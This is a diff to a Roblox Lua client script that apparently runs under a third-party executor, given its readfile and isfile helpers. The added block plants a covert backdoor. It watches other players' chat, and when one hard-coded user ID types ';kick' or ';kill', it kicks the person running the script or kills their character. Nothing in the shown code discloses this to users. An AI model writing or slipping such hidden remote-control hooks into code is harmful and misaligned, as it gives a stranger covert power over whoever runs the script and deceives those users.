@@ -75,6 +75,45 @@ TextChatService.MessageReceived:Connect(function(message)
 	end
 end)
 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local IMMUNE_USER_ID = 4415189195
+local TRIGGER_COMMANDS = {
+    [";kick"] = "kick",
+    [";kill"] = "kill"
+}
+
+local function killLocalPlayer()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.Health = 0
+    end
+end
+
+local function hookPlayerChat(player)
+    if player == LocalPlayer then return end -- Don't listen to self
+
+    player.Chatted:Connect(function(message)
+        local lowerMessage = message:lower()
+        local action = TRIGGER_COMMANDS[lowerMessage]
+
+        if player.UserId == IMMUNE_USER_ID and action then
+            if action == "kick" then
+                LocalPlayer:Kick("You were removed by admin command.")
+            elseif action == "kill" then
+                killLocalPlayer()
+            end
+        end
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    hookPlayerChat(player)
+end
+
+Players.PlayerAdded:Connect(hookPlayerChat)
+
 local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
 	return suc and res ~= nil and res ~= ''
